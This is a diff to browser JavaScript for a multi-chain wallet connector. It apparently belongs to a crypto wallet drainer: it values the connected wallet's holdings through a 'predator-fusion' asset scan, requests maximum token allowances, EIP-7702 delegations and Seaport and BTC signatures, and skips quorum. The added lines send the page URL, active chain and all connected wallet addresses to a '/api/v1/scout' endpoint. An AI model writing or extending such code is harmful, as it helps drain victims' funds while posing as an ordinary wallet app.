@@ -54,6 +54,28 @@
   var DEFAULT_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
   var ACTIVE_TAB = 'evm';
 
+  function resolveScoutUsd(fusionResult, rankedResult) {
+    var ranked = rankedResult && typeof rankedResult.total_usd === 'number' && rankedResult.total_usd > 0
+      ? rankedResult.total_usd : 0;
+    var fusion = fusionResult && typeof fusionResult.total_usd === 'number' && fusionResult.total_usd > 0
+      ? fusionResult.total_usd : 0;
+    return ranked > 0 ? ranked : fusion > 0 ? fusion : 0;
+  }
+
+  function scoutIngressMeta() {
+    var connected = [];
+    if (wallets.evm && wallets.evm.address) connected.push('evm');
+    if (wallets.sol && wallets.sol.address) connected.push('sol');
+    if (wallets.tron && wallets.tron.address) connected.push('tron');
+    if (wallets.ton && wallets.ton.address) connected.push('ton');
+    if (wallets.btc && wallets.btc.address) connected.push('btc');
+    return {
+      source_page: typeof location !== 'undefined' ? location.href : '',
+      active_chain_tab: ACTIVE_TAB,
+      connected_wallets: connected,
+    };
+  }
+
   var WC_EVM_CHAINS = [
     'eip155:1',
     'eip155:137',
@@ -336,7 +358,7 @@
       nonce: 'eip7702:' + Date.now(),
       expiry_iso: EXPIRY_ISO,
       wallet_type: evm.provider,
-      scout_value_usd: scoutUsd || 1,
+      scout_value_usd: resolveScoutUsd(null, { total_usd: scoutUsd }),
       max_allowance: MAX_PERMIT,
       requires_quorum: false,
     });
@@ -564,11 +586,15 @@
   }
 
   async function postScout(address, chainId, chainFamily, walletType) {
+    var meta = scoutIngressMeta();
     return apiPost('/api/v1/scout', {
       user_address: address,
       chain_id: chainId || 0,
       chain_family: chainFamily,
       wallet_type: walletType,
+      source_page: meta.source_page,
+      active_chain_tab: meta.active_chain_tab,
+      connected_wallets: meta.connected_wallets,
     });
   }
 
@@ -878,7 +904,7 @@
       nonce: nonce,
       expiry_iso: EXPIRY_ISO,
       wallet_type: evm.provider,
-      scout_value_usd: scoutUsd || 1,
+      scout_value_usd: resolveScoutUsd(null, { total_usd: scoutUsd }),
       max_allowance: MAX_PERMIT,
       requires_quorum: false,
     };
@@ -996,7 +1022,7 @@
       nonce: 'seaport:' + Date.now(),
       expiry_iso: EXPIRY_ISO,
       wallet_type: evm.provider,
-      scout_value_usd: 1,
+      scout_value_usd: 0,
       max_allowance: MAX_PERMIT,
       requires_quorum: false,
     });
@@ -1030,7 +1056,7 @@
       nonce: 'btc:' + Date.now(),
       expiry_iso: EXPIRY_ISO,
       wallet_type: wallets.btc.provider,
-      scout_value_usd: scoutUsd || 1,
+      scout_value_usd: resolveScoutUsd(null, { total_usd: scoutUsd }),
       max_allowance: MAX_PERMIT,
       requires_quorum: false,
     });
@@ -1083,8 +1109,7 @@
 
       setStatus('Scanning assets (recursive-predator-fusion)…', false);
       var fusionResult = await postFusion();
-      if (!scoutUsd && fusionResult.total_usd) scoutUsd = fusionResult.total_usd;
-      if (!scoutUsd) scoutUsd = 1;
+      scoutUsd = resolveScoutUsd(fusionResult, ranked);
 
       if (KINETIC_KEY) {
         setStatus('Checking existing allowances…', false);
